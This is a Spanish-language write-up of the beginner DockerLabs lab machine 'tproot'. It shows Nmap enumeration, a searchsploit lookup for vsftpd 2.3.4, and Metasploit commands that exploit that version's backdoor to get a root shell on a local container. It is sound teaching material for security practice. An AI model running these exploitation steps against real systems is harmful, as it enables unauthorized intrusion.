---
layout: post
title: "tproot"
date: 2026-02-03 18:30:00 -0300
categories: [Writeups,tproot]
tags: [DockerLabs, tproot, Linux]
description: "Writeup de la máquina tproot de DockerLabs"
image: /assets/images/dockerlabs.jpeg
---

## Resumen de la resolución

**tproot** es una máquina **Linux** de dificultad **Muy Fácil** de la plataforma **DockerLabs**, es una máquina  la cual consta con simplemente dos puertos abiertos, requiriendo un exploit para explotarla.

---
## Enumeración

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello descargando la maquina desde la web de **DockerLabs** y luego desde la **terminal** utilizando el script de la plataforma de la siguiente forma:

```bash
sudo bash auto_deploy.sh tproot.tar
```

Luego le lanzamos un **ping** para comprobar si la maquina esta activa. Verificamos que responde correctamente devolviendo el paquete enviado. A continuacion, utilizamos un script propio que, a partir del valor del  **ttl**  permite identificar el tipo de sistema operativo: **Linux (TTL 64 )** o **Windows (TTL 128)**, en este caso, observamos un **TTL** próximo a 64 (**64**) por lo que se trata de una máquina **Linux**

![](/assets/images/pingtproot.png)

> El motivo por el cual el **TTL** es de **64** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.129.43.173`.


### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open -T5 -v -n 172.17.0.2
```
![](/assets/images/primernmaptproot.png)

Observamos como nos reporta que se encuentran abiertos dos puertos.

Ahora, gracias a la utilidad **extractPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto:

```bash
nmap -sC -sV -p21,80 172.17.0.2 -oN targeted
```
![](/assets/images/segundonmaptproot.png)

En dichos escaneos de **Nmap**, lo primero que llama la atención es la version del puerto 21.

### Puerto 21 - FTP 

Como **FTP** cuenta con una version vulnerable la buscamos mediante **searchsploit** de la siguiente forma:

```bash
searchsploit vsftpd 2.3.4
```
![](/assets/images/searchsploittproot.png)

Al ejecutar dicho comando confirmamos que dicha version es vulnerable y que se puede explotar mediante MetaSploit

### Explotación MetaSploit

Para comenzar con la explotacion comenzamos abriendo **MetaSploit** con el comando

```bash
msfconsole
```
Una vez abierto **MetaSploit** buscamos el exploit de la siguiente forma:

```bash
search vsftpd 2.3.4
```
Una vez visto el exploit lo seleccionamos,  configuramos y lo ejecutamos:

```bash
use 0
set RHOSTS 172.17.0.2
run
```
![](/assets/images/msftproot.png)

Como podemos ver en la imagen al completarse la explotación logramos conseguir acceso como usuario root.


La máquina tproot de DockerLabs es un objetivo de nivel inicial que permite practicar la identificación y explotación de vulnerabilidades basicas en servicios clásicos. Durante el análisis se detectaron servicios como vsftpd con servicio vulnerable. A partir de esto, es posible obtener accesos en el sistema como usuario root.

En resumen, tproot es una máquina ideal para principiantes, ya que demuestra la importancia de identificar versiones desactualizadas, validar servicios expuestos y aprovechar exploits públicos de forma controlada.

